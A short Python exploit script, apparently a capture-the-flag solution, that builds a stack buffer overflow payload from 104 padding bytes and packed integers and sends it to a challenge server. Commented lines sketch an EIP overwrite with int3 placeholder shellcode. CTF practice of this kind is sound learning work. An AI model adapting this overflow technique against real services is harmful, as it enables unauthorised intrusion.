#!/bin/python3
import sys
import struct
import socket

# Each integer is 4 bytes

# char userInput [104];
# int 0x159;
# int 0x2a6;
# int 0x4c;
# int 0x1ed;
# int 0x29a;
# int 0x3cc;
# int 0x17;
# int 3000;
# int 0x4fc;
# int 0x1;
# int 0x3cd;
# int 0xe7;
# int 0x1d;
# int 0x345;
# int 0x62;
# int 0x20;
# int 0x463;
# int 0x20;
# int 0;
# int 0x62;
# int 0x7c3;
# int 0x147a2;
# int 0x21e;
# int 0x7b;
# int 0x1282;
# int 0xea;

# padding = "AAAAAAAA"
# eip = struct.pack("I", 0xbffff7c0)
# payload = "\xCC" * 4
# print(eip)
# print(eip.decode())
# payload = padding + '\xc0\xf7\xff\xbf' + payload
# print(payload)
# exit()
offset = 104
payload = bytes("A"*offset, 'utf-8')
# print(f"payload: {payload}")
with open("code.txt", 'r') as handle:
    for line in handle:
        hexValue = line.strip()
        intValue = int(hexValue,16)
        # print(f"{hexValue}: {intValue}")
        packedInt = struct.pack('<I', intValue)
        # print(f"packed: {packedInt}")
        payload += packedInt

payload += struct.pack('c', b'\n')

# print("Payload:")
with open('payload', 'wb') as pfile:
    pfile.write(payload)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
url = "challenges.laptophackingcoffee.org"
port = 2341
sock.connect((url, port))
response = sock.recv(1024)
print(response.decode())
sock.send(payload)
response = sock.recv(1024)
print(response.decode())
# size = sys.getsizeof(payload)

# print(payload)
# print(size)
# print(len(payload))
# print(sys.getsizeof(8))

# 159
# 2a6
# 4c
# 1ed
# 29a
# 3cc
# 17
# # int 3000
# 4fc
# 1
# 3cd
# e7
# 1d
# 345
# 62p2
# 20p2
# 463
# 20
# # int 0
# 62
# 7c3
# 147a2
# 21e
# 7b
# 1282
# ea